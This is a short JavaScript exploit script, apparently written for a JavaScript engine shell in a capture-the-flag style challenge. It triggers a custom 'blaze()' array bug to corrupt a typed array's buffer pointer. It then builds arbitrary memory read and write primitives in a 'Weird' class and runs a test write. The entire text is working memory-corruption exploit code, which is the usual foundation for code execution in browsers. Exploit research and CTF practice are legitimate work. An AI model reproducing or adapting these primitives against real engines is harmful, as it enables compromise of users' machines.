load('/root/utils.js')
load('/root/int64.js')

const blazed = new Array(1,2,3,4,5,6);
const targetArray = new Uint8Array(8);

var blazedFirstElementAddr = objectAddress(blazed);
print('[*] Blazed is at: ' + blazedFirstElementAddr);
blazedFirstElementAddr = new Int64().assignAdd(blazedFirstElementAddr, 0x30);

var targetAddress = objectAddress(targetArray);
print('[*] Target array is at: ' + targetAddress);
targetAddress = new Int64().assignAdd(targetAddress, 0x38);
print("[*] Target array's buffer will be at: " + targetAddress.toString());

// This should always be 13!
var magicIndex = parseInt(new Int64().assignSub(targetAddress, blazedFirstElementAddr).toString()) / 8;
print("[*] Magic index is: " + magicIndex);

blazed.blaze();

class Weird {
	read(addr, length) {
		if (length > 8) {
			print("[-] Can't read more than 8 bytes!");
			return;
		}

		blazed[magicIndex] = new Int64(addr).asDouble();
		var data = targetArray.slice(0, 8);
		this.restore();
		return data;
	}

	write(addr, value) {
		print('[*] About to write ' + value + ' to address ' + addr);
		blazed[magicIndex] = new Int64(addr).asDouble();
		var values = new Int64(value).bytes();
		print('[*] values = ' + values);
		targetArray.set(values);
		this.restore();
	}

	restore() {
		blazed[magicIndex] = targetAddress;
	}
}

weird = new Weird();
weird.write(blazedFirstElementAddr, 9)
